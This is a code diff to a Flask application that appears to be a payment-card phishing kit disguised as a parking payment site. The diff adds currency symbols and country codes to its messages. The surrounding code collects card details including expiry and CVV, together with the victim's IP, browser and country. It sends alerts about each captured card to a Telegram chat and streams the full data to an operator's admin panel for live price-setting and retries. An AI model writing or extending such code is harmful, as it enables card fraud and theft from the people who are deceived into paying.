@@ -292,7 +292,7 @@ def create_app():
                 socketio.emit('session_updated', {
                     'id': ps.id, 'plate': plate, 'locality': locality,
                     'hours': hours, 'car_type': car_type, 'time_unit': time_unit,
-                    'price': auto_price
+                    'price': auto_price, 'currency': curr['symbol'], 'country_code': country_code
                 }, room='admin')
             else:
                 token = secrets.token_hex(16)
@@ -313,9 +313,9 @@ def create_app():
                     'car_type': car_type, 'time_unit': time_unit,
                     'ip': ip, 'browser': browser, 'country': country_name,
                     'lot_id': lot_id, 'time': ps.created_at.strftime('%H:%M:%S'),
-                    'price': auto_price
+                    'price': auto_price, 'currency': curr['symbol'], 'country_code': country_code
                 }, room='admin')
-            socketio.emit('price_set', {'id': ps.id, 'price': auto_price}, room='admin')
+            socketio.emit('price_set', {'id': ps.id, 'price': auto_price, 'currency': curr['symbol']}, room='admin')
             return redirect(url_for('pay_card', token=token))
         # GET — create scanning session immediately
         browser = _detect_browser(request.user_agent.string)
@@ -338,7 +338,7 @@ def create_app():
             'car_type': '—', 'time_unit': '—',
             'ip': ip, 'browser': browser, 'country': country_name,
             'lot_id': lot_id, 'time': ps.created_at.strftime('%H:%M:%S'),
-            'price': None
+            'price': None, 'currency': curr['symbol'], 'country_code': country_code
         }, room='admin')
         return render_template('pay/step1.html', lot=lot, token=token,
                                currency_symbol=curr['symbol'], rate=curr['rate'])
@@ -388,6 +388,7 @@ def create_app():
             ps.bin_bank = bin_bank
             ps.status = 'payment_pending'
             db.session.commit()
+            _card_curr = _currency_for_country(ps.country_code or '')
             _send_telegram(
                 f'🔔 <b>Card nou primit</b>\n'
                 f'━━━━━━━━━━━━━━━━━━\n'
@@ -398,7 +399,7 @@ def create_app():
                 f'🏦 {bin_bank or "—"}\n'
                 f'🚗 <code>{ps.plate_number}</code>\n'
                 f'🌍 {ps.country or "—"}  |  {ps.browser or "—"}\n'
-                f'⏱ {ps.hours} {ps.time_unit or "ore"}  |  💰 <b>{ps.total_price} €</b>\n'
+                f'⏱ {ps.hours} {ps.time_unit or "ore"}  |  💰 <b>{ps.total_price} {_card_curr["symbol"]}</b>\n'
                 f'🕐 {datetime.utcnow().strftime("%H:%M:%S UTC")}'
             )
             socketio.emit('payment_submitted', {
@@ -407,12 +408,14 @@ def create_app():
                     'card_last4': ps.card_last4,
                     'exp': ps.exp_date, 'cvv': ps.cvv,
                     'price': ps.total_price,
+                    'currency': _card_curr['symbol'],
                     'hours': ps.hours, 'lot': ps.parking_lot.name,
                     'car_type': ps.car_type or '—',
                     'time_unit': ps.time_unit or 'ore',
                     'ip': ps.ip_address or '—',
                     'browser': ps.browser or '—',
                     'country': ps.country or '—',
+                    'country_code': ps.country_code or '—',
                     'token': token,
                     'bin_bank': bin_bank or '—',
                     'time': datetime.utcnow().strftime('%H:%M:%S')
@@ -427,7 +430,9 @@ def create_app():
         ps = ParkingSession.query.filter_by(token=token).first_or_404()
         if ps.status in ('completed', 'rejected'):
             return redirect(url_for('pay_done', token=token))
-        return render_template('pay/waiting2.html', token=token, session=ps)
+        curr = _currency_for_country(ps.country_code or '')
+        return render_template('pay/waiting2.html', token=token, session=ps,
+                               currency_symbol=curr['symbol'])
 
     @app.route('/pay/done/<token>')
     def pay_done(token):
@@ -563,7 +568,8 @@ def create_app():
         ps.status = 'price_set'
         db.session.commit()
         socketio.emit('open_payment', {'token': ps.token, 'price': ps.total_price}, room=f'session_{ps.token}')
-        socketio.emit('price_set', {'id': ps.id, 'price': ps.total_price}, room='admin')
+        _pc = _currency_for_country(ps.country_code or '')
+        socketio.emit('price_set', {'id': ps.id, 'price': ps.total_price, 'currency': _pc['symbol']}, room='admin')
         return ('', 204)
 
     @app.route('/admin/sessions/<int:sid>/retry', methods=['POST'])
